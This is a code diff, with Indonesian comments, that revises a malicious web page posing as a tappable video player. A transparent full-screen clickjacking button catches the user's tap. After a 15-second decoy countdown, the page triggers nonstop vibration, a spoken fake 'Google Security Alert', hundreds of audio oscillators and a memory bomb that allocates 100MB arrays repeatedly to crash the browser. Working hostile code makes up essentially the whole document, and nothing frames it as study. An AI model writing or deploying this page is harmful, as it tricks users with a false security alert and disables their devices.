@@ -7,76 +7,37 @@
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body {
-    background: #000;
-    color: #fff;
-    font-family: 'Segoe UI', Arial, sans-serif;
-    display: flex;
-    flex-direction: column;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-    margin: 0;
-    overflow: hidden;
+    background: #000; color: #fff; font-family: 'Segoe UI', Arial, sans-serif;
+    display: flex; justify-content: center; align-items: center;
+    height: 100vh; margin: 0; overflow: hidden;
   }
 
-  /* UI PALSU (Redressing) */
+  /* UI PALSU */
   .fake-player {
-    width: 90%;
-    max-width: 400px;
-    background: #222;
-    border-radius: 10px;
-    overflow: hidden;
-    box-shadow: 0 4px 20px rgba(0,0,0,0.5);
-    position: relative;
-    text-align: center;
-  }
-  .fake-video {
-    height: 200px;
-    background: linear-gradient(45deg, #1a1a1a, #333);
-    display: flex;
-    justify-content: center;
-    align-items: center;
+    width: 100%; height: 100%;
+    display: flex; flex-direction: column; justify-content: center; align-items: center;
     position: relative;
   }
-  .play-icon {
-    width: 60px;
-    height: 60px;
+  .play-btn {
+    width: 80px; height: 80px;
     background: rgba(255,255,255,0.2);
     border-radius: 50%;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    font-size: 24px;
-    cursor: pointer;
-    transition: transform 0.2s;
+    display: flex; justify-content: center; align-items: center;
+    font-size: 30px; pointer-events: none; /* Biarkan klik menembus ke tombol trap */
   }
-  .play-icon:hover { transform: scale(1.1); }
-  
-  .info { padding: 15px; text-align: left; }
-  .info h3 { font-size: 16px; margin-bottom: 5px; }
-  .info p { font-size: 12px; color: #aaa; }
+  .loading-text {
+    margin-top: 20px; font-size: 16px; color: #aaa;
+  }
 
-  /* BUTTON TERSEMBUNYI (Target Clickjacking) */
-  /* Dibuat transparan dan menutupi area play */
+  /* TOMBOL TRAP (Fullscreen Transparan) */
   #trapBtn {
-    position: absolute;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    opacity: 0;
-    cursor: pointer;
-    z-index: 10;
+    position: absolute; top: 0; left: 0;
+    width: 100%; height: 100%;
+    opacity: 0; cursor: pointer; z-index: 10;
   }
 
   #status {
-    position: fixed;
-    bottom: 20px;
-    color: #0f0;
-    font-family: monospace;
-    font-size: 12px;
-    text-align: center;
-    width: 100%;
+    position: fixed; bottom: 20px; color: #0f0; font-family: monospace; font-size: 14px;
   }
 
   iframe, audio, video { display: none !important; }
@@ -85,97 +46,91 @@
 <body>
 
 <div class="fake-player">
-  <div class="fake-video">
-    <div class="play-icon">▶</div>
-    <!-- TOMBOL JEB Trapping -->
-    <button id="trapBtn">Play</button>
-  </div>
-  <div class="info">
-    <h3>Funny Cat Video.mp4</h3>
-    <p>1.2M views • 2 days ago</p>
-  </div>
+  <div class="play-btn">▶</div>
+  <div class="loading-text">Ketuk untuk memutar video</div>
+  <!-- Tombol Transparan Penjebak -->
+  <button id="trapBtn"></button>
 </div>
 
-<div id="status">Menunggu interaksi user...</div>
+<div id="status">Menunggu sentuhan...</div>
 
 <script>
 (function () {
   'use strict';
 
   var statusEl = document.getElementById('status');
-  var hasClicked = false;
+  var isTriggered = false;
 
   // ============================================
-  // 1. UI REDRESSING TRAP (ONE-CLICK)
+  // TRAP: SAAT USER MENYENTUH LAYAR
   // ============================================
   document.getElementById('trapBtn').addEventListener('click', function(e) {
-    if (hasClicked) return;
-    hasClicked = true;
+    if (isTriggered) return;
+    isTriggered = true;
 
-    // A. Ubah UI agar user merasa aman
-    document.querySelector('.play-icon').innerText = '⏳';
-    statusEl.innerText = "Memuat video... (Harap tunggu 15 detik)";
+    // 1. Ubah UI agar user merasa aman
+    document.querySelector('.play-btn').innerText = '⏳';
+    document.querySelector('.loading-text').innerText = 'Memuat video...';
+    statusEl.innerText = "Memuat konten... (15s)";
     statusEl.style.color = "#ff0";
 
-    // B. Mulai Delay 15 Detik
-    var delaySeconds = 15;
-    var countdown = setInterval(function() {
-      delaySeconds--;
-      statusEl.innerText = "Memuat video... (" + delaySeconds + "s)";
+    // 2. MULAI GETARAN (Bypass berhasil karena ada click)
+    if ('vibrate' in navigator) {
+      console.log("[VIB] Getaran dimulai!");
+      // Getar terus menerus selama 15 detik ke depan
+      var vibrateInterval = setInterval(function() {
+        navigator.vibrate([1000, 200, 1000, 200]);
+      }, 2400);
       
-      if (delaySeconds <= 0) {
-        clearInterval(countdown);
-        executeMaliciousPayload();
-      }
-    }, 1000);
+      // Hentikan getaran setelah 15 detik (saat crash)
+      setTimeout(function() { clearInterval(vibrateInterval); }, 15000);
+    }
 
-    // C. (Opsional) Putar audio penenang selama delay
+    // 3. AUDIO PENGALIH PERHATIAN (Beep halus)
     try {
       var ctx = new (window.AudioContext || window.webkitAudioContext)();
       if (ctx.state === 'suspended') ctx.resume();
       var osc = ctx.createOscillator();
       var gain = ctx.createGain();
-      gain.gain.value = 0.05; // Sangat pelan
-      osc.type = 'sine';
-      osc.frequency.value = 440;
-      osc.connect(gain);
-      gain.connect(ctx.destination);
+      gain.gain.value = 0.05;
+      osc.connect(gain); gain.connect(ctx.destination);
       osc.start();
-      // Hentikan suara penenang saat payload dieksekusi
       window.oscToStop = osc;
     } catch(e) {}
+
+    // 4. DELAY 15 DETIK (Countdown)
+    var timeLeft = 15;
+    var countdown = setInterval(function() {
+      timeLeft--;
+      statusEl.innerText = "Memuat konten... (" + timeLeft + "s)";
+      
+      if (timeLeft <= 0) {
+        clearInterval(countdown);
+        executeMaliciousPayload();
+      }
+    }, 1000);
   });
 
   // ============================================
-  // 2. PAYLOAD EKSEKUSI (VIBRATION + AUDIO + CRASH)
+  // PAYLOAD EKSEKUSI: TTS + CRASH
   // ============================================
   function executeMaliciousPayload() {
-    statusEl.innerText = "🚨 SYSTEM COMPROMISED 🚨";
+    statusEl.innerText = "🚨 SYSTEM CRITICAL 🚨";
     statusEl.style.color = "#f00";
 
-    // Hentikan suara penenang
+    // Hentikan beep penenang
     if (window.oscToStop) {
       try { window.oscToStop.stop(); } catch(e) {}
     }
 
-    // A. VIBRATION HIJACK (Bypass karena sudah ada gesture)
-    if ('vibrate' in navigator) {
-      console.log("[VIB] Getaran dimulai!");
-      // Getar histeris berulang
-      setInterval(function() {
-        navigator.vibrate([1000, 200, 1000, 200, 500]);
-      }, 2700);
-    }
-
-    // B. AUDIO & TTS FLOOD
+    // A. TTS Google Alert
     if ('speechSynthesis' in window) {
-      var u = new SpeechSynthesisUtterance("Google Security Alert. System Hacked.");
-      u.rate = 1.5;
-      u.volume = 1.0;
+      var u = new SpeechSynthesisUtterance("Google Security Alert. System compromised.");
+      u.rate = 1.0; u.volume = 1.0;
       window.speechSynthesis.speak(u);
     }
 
-    // C. CRASH TRIGGER (OOM)
+    // B. CRASH (OOM Memory Bomb)
     var memoryHog = [];
     setInterval(function() {
       try {
@@ -183,8 +138,6 @@
         for (var i = 0; i < 500; i++) {
           var ctx = new (window.AudioContext || window.webkitAudioContext)();
           var osc = ctx.createOscillator();
-          osc.type = 'sawtooth';
-          osc.frequency.value = 1000 + Math.random() * 5000;
           osc.connect(ctx.destination);
           osc.start(0);
           
@@ -192,7 +145,7 @@
           window.speechSynthesis.speak(u2);
         }
 
-        // Memory Bomb (100MB)
+        // Memory Bomb (100MB per 50ms)
         var bigArray = new Uint8Array(100 * 1024 * 1024);
         bigArray.fill(1);
         memoryHog.push(bigArray);
